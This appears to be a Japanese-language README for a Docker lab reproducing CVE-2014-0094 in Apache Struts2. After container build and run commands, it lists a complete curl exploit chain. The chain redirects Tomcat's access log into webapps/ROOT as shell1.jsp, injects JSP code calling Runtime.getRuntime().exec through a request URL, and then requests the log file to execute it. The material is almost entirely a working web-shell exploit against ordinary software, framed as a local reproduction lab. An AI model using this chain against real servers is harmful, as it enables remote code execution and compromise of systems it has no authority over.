CVE-2014-0094
====


### container build
```
docker build -t cvecontainer/2014_0094 .
```
### container run
```
docker run -p 8080:8080 cvecontainer/2014_0094 
```
### アクセスログの出力先をwebapps/ROOTに変更
```
curl http://container:8080/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
```
### アクセスログの拡張子を.jspに変更
```
curl http://container:8080/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.prefix=shell
curl http://container:8080/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
```
### アクセスログの日付部分(yyyy-mm-dd)を1に変更する。
### ↑の2つのコマンドとあわせて、アクセスログはshell1.jspに吐き出されるように
```
curl http://container:8080/struts2-blank/example/HelloWorld.action?class.classLoader.resources.context.parent.pipeline.first.fileDateFormat=1
```
### アクセスログにJSPコードを埋め込み
```
curl http://container:8080/struts2-blank/example/aaaa.jsp?a=<%Runtime.getRuntime().exec("finder");%>
```
### アクセスログにアクセスすることで、jsp実行
```
curl http://container:8080/shell1.jsp
```

